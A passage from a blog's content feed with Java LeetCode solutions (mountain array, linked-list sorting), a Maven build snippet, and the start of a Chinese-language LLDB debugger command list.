class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>build：项目构建时的配置</p>
</li>
<li><p>finalName：在浏览器中的访问路径，如果将它改成helloworld，再执行maven–update，这时运行项目的访问路径是 <a href="http://localhost:8080/helloworld/">http://localhost:8080/helloworld/</a>, 而不是项目名的  <a href="http://localhost:8080/test">http://localhost:8080/test</a></p>
</li>
<li>plugins：插件，之前篇章已经说过，第一个插件是用来设置java版本为1.7，第二个插件是我刚加的，用来设置编码为utf-8</li>
<li>group id+artifact id+version：插件在仓库中的坐标</li>
<li>configuration：设置插件的参数值</li>
</ul>
<h2 id="本地仓库"><a href="#本地仓库" class="headerlink" title="本地仓库"></a>本地仓库</h2><p>运行机制：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15375008510817.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> TOOLS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[941. Valid Mountain Array]]></title>
      <url>/wiki/2017/10/30/Leetcode-941-Valid-Mountain-Array/</url>
      <content type="html"><![CDATA[<p>Given an array A of integers, return true if and only if it is a valid mountain array.</p>
<p>Recall that A is a mountain array if and only if:</p>
<ul>
<li>A.length &gt;= 3</li>
<li>There exists some $i$ with 0 &lt; $i$ &lt; A.length - 1 such that:<ul>
<li>A[0] &lt; A[1] &lt; … A[$i$-1] &lt; A[$i$]</li>
<li>A[$i$] &gt; A[$i$+1] &gt; … &gt; A[B.length - 1]</li>
</ul>
</li>
</ul>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [2,1]</span><br><span class="line">Output: false</span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input: [3,5,5]</span><br><span class="line">Output: false</span><br><span class="line">Example 3:</span><br><span class="line"></span><br><span class="line">Input: [0,3,2,1]</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>0 &lt;= A.length &lt;= 10000</li>
<li>0 &lt;= A[$i$] &lt;= 10000 </li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>考查基本的数组操作。</p>
<p>一个人从一侧开始爬山。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">validMountainArray</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A == <span class="keyword">null</span> || A.length &lt; <span class="number">3</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">int</span> n = A.length;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n &amp;&amp; A[i] &gt; A[i - <span class="number">1</span>]; i++) ;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">1</span> || i == n) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; n &amp;&amp; A[i] &lt; A[i - <span class="number">1</span>]; i++) ;</span><br><span class="line">    <span class="keyword">if</span> (i != n) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两个人分别从山的两侧开始爬，如果是山，他们会在山顶相遇。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">validMountainArray</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = A.length, i = <span class="number">0</span>, j = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i + <span class="number">1</span> &lt; n &amp;&amp; A[i] &lt; A[i + <span class="number">1</span>]) i++;</span><br><span class="line">    <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; A[j - <span class="number">1</span>] &gt; A[j]) j--;</span><br><span class="line">    <span class="keyword">return</span> i &gt; <span class="number">0</span> &amp;&amp; i == j &amp;&amp; j &lt; n - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[437. Path Sum III]]></title>
      <url>/wiki/2017/10/30/Leetcode-437-Path-Sum-III/</url>
      <content type="html"><![CDATA[<p>You are given a binary tree in which each node contains an integer value.</p>
<p>Find the number of paths that sum to a given value.</p>
<p>The path does not need to start or end at the root or a leaf, but it must go downwards (traveling only from parent nodes to child nodes).</p>
<p>The tree has no more than 1,000 nodes and the values are in the range -1,000,000 to 1,000,000.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root = [10,5,-3,3,2,null,11,3,-2,null,1], sum = 8</span><br><span class="line"></span><br><span class="line">      10</span><br><span class="line">     /  \</span><br><span class="line">    5   -3</span><br><span class="line">   / \    \</span><br><span class="line">  3   2   11</span><br><span class="line"> / \   \</span><br><span class="line">3  -2   1</span><br><span class="line"></span><br><span class="line">Return 3. The paths that sum to 8 are:</span><br><span class="line"></span><br><span class="line">1. 5 -&gt; 3</span><br><span class="line">2. 5 -&gt; 2 -&gt; 1</span><br><span class="line">3. -3 -&gt; 11</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[148. Sort List]]></title>
      <url>/wiki/2017/10/30/Leetcode-148-Sort-List/</url>
      <content type="html"><![CDATA[<p>Sort a linked list in $O(n \log n)$ time using constant space complexity.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 4-&gt;2-&gt;1-&gt;3</span><br><span class="line">Output: 1-&gt;2-&gt;3-&gt;4</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: -1-&gt;5-&gt;3-&gt;4-&gt;0</span><br><span class="line">Output: -1-&gt;0-&gt;3-&gt;4-&gt;5</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>排序链表，要求空间复杂度为$O(1)$，时间复杂度为$O(n\log n)$。既然要排序，很容易想到常见的排序方法，符合时间复杂度和空间复杂度的排序有快速排序和归并排序。</p>
<p>对于归并排序，把链表拆分成子链表，递归排序子链表，然后再合并链表。链表与数组不同，不能直接索引。为了表示子链表，一种方法是子链表在链表中的首尾位置，另一种更简单的方法是直接用子链表的首部位置表示，而将尾部位置设置为null。这是关键的一步，可以节省很多不必要的麻烦。链表的分割可参考LeetCode 21. Merge Two Sorted Lists，链表的中点可参考LeetCode 876. Middle of the Linked List。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">sortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">    ListNode mid = midList(head);</span><br><span class="line">    ListNode right = sortList(mid.next);     <span class="comment">// sort right half</span></span><br><span class="line">    mid.next = <span class="keyword">null</span>;</span><br><span class="line">    ListNode left = sortList(head);          <span class="comment">// sort left half</span></span><br><span class="line">    <span class="keyword">return</span> merge(left, right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// merge linkedlist l1 nad l2</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> ListNode <span class="title">merge</span><span class="params">(ListNode left, ListNode right)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// find head of the linkedlist after sorted</span></span><br><span class="line">    ListNode head, pos;</span><br><span class="line">    <span class="keyword">if</span> (left.val &lt; right.val) &#123; head = left; left = left.next; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;head = right; right = right.next; &#125;</span><br><span class="line">    pos = head;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// iterate the linked list, link smaller element to head</span></span><br><span class="line">    <span class="keyword">while</span> (left != <span class="keyword">null</span> &amp;&amp;  right != <span class="keyword">null</span>) &#123; <span class="comment">// both iterate to the end of list</span></span><br><span class="line">        <span class="keyword">if</span> (left.val &lt; right.val) &#123; pos.next = left; left = left.next;&#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;pos.next = right; right = right.next;&#125;</span><br><span class="line">        pos = pos.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// add remaining linkedlist</span></span><br><span class="line">    pos.next = left != <span class="keyword">null</span> ? left : right;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// find middle node of given linkedlist</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> ListNode <span class="title">midList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    ListNode slow = head, fast = head.next;</span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用快速排序，比归并排序复杂，原因至少有以下几点</p>
<ul>
<li>无法访问链表的前一个节点，也就意味着传统的partition方法在这里不适用，在partition时，只能将小于pivot的节点<em>插入</em>到pivot前面，将大于pivot的节点插入到pivot后面。</li>
<li>传统的快速排序通过shuffle来保证平均时间复杂度，这里也不能适用。</li>
<li>插入元素的时候，不能适用dummy node，因为空间复杂度必须为$O(1)$，论坛上好多快速排序的答案都不符合要求。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">sortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> quickSort(head, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">quickSort</span><span class="params">(ListNode begin, ListNode end)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// quit condition: only one node</span></span><br><span class="line">    <span class="keyword">if</span> (begin == end) <span class="keyword">return</span> begin;</span><br><span class="line">    ListNode head = partition(begin, end);      <span class="comment">// partition, result: head .... begin...end</span></span><br><span class="line">    ListNode h1 = quickSort(head, begin);       <span class="comment">// sort left part, result: h1... head....</span></span><br><span class="line">    ListNode h2 = quickSort(begin.next, end);   <span class="comment">// sort right part, result: h2... begin.next...</span></span><br><span class="line">    begin.next = h2;</span><br><span class="line">    <span class="keyword">return</span> h1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// use begin as pivot:</span></span><br><span class="line"><span class="comment">// left to the begin is less than pivot, right to the begin is larger than pivot</span></span><br><span class="line"><span class="function">ListNode <span class="title">partition</span><span class="params">(ListNode begin, ListNode end)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// head is the head, cur is currently visiting node, pre is the node before cur.</span></span><br><span class="line">    ListNode head = begin, pre = head, cur = pre.next;</span><br><span class="line">    <span class="keyword">int</span> pivotValue = head.val; <span class="comment">//pivot value</span></span><br><span class="line">    <span class="keyword">while</span> (cur != end) &#123;</span><br><span class="line">        <span class="comment">// insert current node before head if it's value is less than pivot</span></span><br><span class="line">        <span class="keyword">if</span> (cur != <span class="keyword">null</span> &amp;&amp; cur.val &lt; pivotValue) &#123;</span><br><span class="line">            pre.next = cur.next;</span><br><span class="line">            cur.next = head;</span><br><span class="line">            head = cur;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pre = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = pre.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Sort </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[147. Insertion Sort List]]></title>
      <url>/wiki/2017/10/30/Leetcode-147-Insertion-Sort-List/</url>
      <content type="html"><![CDATA[<p>Sort a linked list using insertion sort.</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/0/0f/Insertion-sort-example-300px.gif" alt=""></p>
<p><small>A graphical example of insertion sort. The partial sorted list (black) initially contains only the first element in the list.<br>With each iteration one element (red) is removed from the input data and inserted in-place into the sorted list</small></p>
<p>Algorithm of Insertion Sort:</p>
<ul>
<li>Insertion sort iterates, consuming one input element each repetition, and growing a sorted output list.</li>
<li>At each iteration, insertion sort removes one element from the input data, finds the location it belongs within the sorted list, and inserts it there.</li>
<li>It repeats until no input elements remain.</li>
</ul>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 4-&gt;2-&gt;1-&gt;3</span><br><span class="line">Output: 1-&gt;2-&gt;3-&gt;4</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: -1-&gt;5-&gt;3-&gt;4-&gt;0</span><br><span class="line">Output: -1-&gt;0-&gt;3-&gt;4-&gt;5</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目非常直接，告诉了我们使用的算法-插入排序。但是唯一的区别是这里要排序的数据是链表。最直接的想法是把链表转换为数组，然后排序，然后再还原为链表。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">insertionSortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// the length of the Linkedlist</span></span><br><span class="line">    <span class="keyword">int</span> size = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    ListNode curList = head;</span><br><span class="line">    <span class="keyword">while</span> (curList != <span class="keyword">null</span>) &#123;</span><br><span class="line">        curList = curList.next;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// special occasion</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">2</span>) <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convert LinkedList to an array</span></span><br><span class="line">    ListNode[] array = <span class="keyword">new</span> ListNode[size];</span><br><span class="line">    curList = head;</span><br><span class="line">    <span class="keyword">while</span> (curList != <span class="keyword">null</span>) &#123;</span><br><span class="line">        array[i++] = curList;</span><br><span class="line">        curList = curList.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// insertion sort the array</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">        j = i;</span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; array[j].val &lt; array[j-<span class="number">1</span>].val) &#123;</span><br><span class="line">            curList = array[j];</span><br><span class="line">            array[j] = array[j-<span class="number">1</span>];</span><br><span class="line">            array[j - <span class="number">1</span>] = curList;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reconstruct linkedlist</span></span><br><span class="line">    ListNode res = array[<span class="number">0</span>];</span><br><span class="line">    curList = res;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; array.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        curList.next = array[i];</span><br><span class="line">        curList = curList.next;</span><br><span class="line">    &#125;</span><br><span class="line">    curList.next = array[array.length - <span class="number">1</span>];</span><br><span class="line">    curList.next.next = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然这种来回的转换其实是非常慢的。有没有一种方法可以直接插入排序呢？有的。这种方法利用了链表的一个特点 – 可以在任意位置插入或者删除一个元素。当用插入排序数组时，我们依次和前面的元素比较，当发现前面的元素大与当前元素时，交换这两种元素，直到前面的元素都小与该元素，这时候该元素就插入到了正确位置。问题是链表需要一一交换吗？根本不需要！既然可以在任意位置删除，只需要一直比较前面的元素，直到发现正确的位置，然后插入到该位置即可。[<a href="https://leetcode.com/problems/insertion-sort-list/discuss/46497/7ms-Java-solution-with-explanation">ref</a>]</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">insertionSortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ListNode sortedHead = head, sortedTail = head;</span><br><span class="line">    head = head.next;</span><br><span class="line">    sortedHead.next = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (head != <span class="keyword">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ListNode temp = head;</span><br><span class="line">        head = head.next;</span><br><span class="line">        temp.next = <span class="keyword">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// new val is less than the head, just insert in the front</span></span><br><span class="line">        <span class="keyword">if</span> (temp.val &lt;= sortedHead.val)</span><br><span class="line">        &#123;</span><br><span class="line">            temp.next = sortedHead;</span><br><span class="line">            sortedTail = sortedHead.next == <span class="keyword">null</span> ? sortedHead : sortedTail;</span><br><span class="line">            sortedHead = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// new val is greater than the tail, just insert at the back</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (temp.val &gt;= sortedTail.val)</span><br><span class="line">        &#123;</span><br><span class="line">            sortedTail.next = temp;</span><br><span class="line">            sortedTail = sortedTail.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// new val is somewhere in the middle, we will have to find its proper</span></span><br><span class="line">        <span class="comment">// location.</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ListNode current = sortedHead;</span><br><span class="line">            <span class="keyword">while</span> (current.next != <span class="keyword">null</span> &amp;&amp; current.next.val &lt; temp.val)</span><br><span class="line">            &#123;</span><br><span class="line">                current = current.next;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            temp.next = current.next;</span><br><span class="line">            current.next = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sortedHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Sort </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[LLDB使用]]></title>
      <url>/wiki/2017/10/30/TOOLS-LLDB%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<p><a href="http://lldb.llvm.org"><code>lldb</code></a>是一个开源的下一代高性能调试器。LLDB是MAC上的默认调试器，支持调试C、Objective-C和C++语言。</p>
<p>可以比较LLDB与GDB命令的<a href="http://lldb.llvm.org/lldb-gdb.html">对照表</a>。</p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">调试器命令:</span><br><span class="line"> </span><br><span class="line">  apropos           -- 列出与单词或主题相关的调试器命令</span><br><span class="line">  breakpoint        -- 在断点上操作的命令 (详情使用&apos;help b&apos;查看)</span><br><span class="line">  bugreport         -- 用于创建指定域的错误报告</span><br><span class="line">  command           -- 用于管理自定义LLDB命令的命令</span><br><span class="line">  disassemble       -- 拆分当前目标中的特定说明。 默认为当前线程和堆栈帧的当前函数</span><br><span class="line">  expression        -- 求当前线程上的表达式的值。 以LLDB默认格式显示返回的值</span><br><span class="line">  frame             -- 用于选择和检查当前线程的堆栈帧的命令</span><br><span class="line">  gdb-remote        -- 通过远程GDB服务器连接到进程。 如果未指定主机，则假定为localhost</span><br><span class="line">  gui               -- 切换到基于curses的GUI模式</span><br><span class="line">  help              -- 显示所有调试器命令的列表，或提供指定命令的详细信息</span><br><span class="line">  kdp-remote        -- 通过远程KDP服务器连接到进程。 如果没有指定UDP端口，则假定端口41139</span><br><span class="line">  language          -- 指定源语言</span><br><span class="line">  log               -- 控制LLDB内部日志记录的命令</span><br><span class="line">  memory            -- 用于在当前目标进程的内存上操作的命令</span><br><span class="line">  platform          -- 用于管理和创建平台的命令</span><br><span class="line">  plugin            -- 用于管理LLDB插件的命令</span><br><span class="line">  process           -- 用于与当前平台上的进程交互的命令</span><br><span class="line">  quit              -- 退出LLDB调试器</span><br><span class="line">  register          -- 命令访问当前线程和堆栈帧的寄存器</span><br><span class="line">  script            -- 使用提供的代码调用脚本解释器并显示任何结果。 如果没有提供代码，启动交互式解释器。</span><br><span class="line">  settings          -- 用于管理LLDB设置的命令</span><br><span class="line">  source            -- 检查当前目标进程的调试信息所描述的源代码的命令</span><br><span class="line">  target            -- 用于在调试器目标上操作的命令</span><br><span class="line">  thread            -- 用于在当前进程中的一个或多个线程上操作的命令</span><br><span class="line">  type              -- 在类型系统上操作的命令</span><br><span class="line">  version           -- 显示LLDB调试器版本</span><br><span class="line">  watchpoint        -- 在观察点上操作的命令</span><br><span class="line"> </span><br><span class="line"> 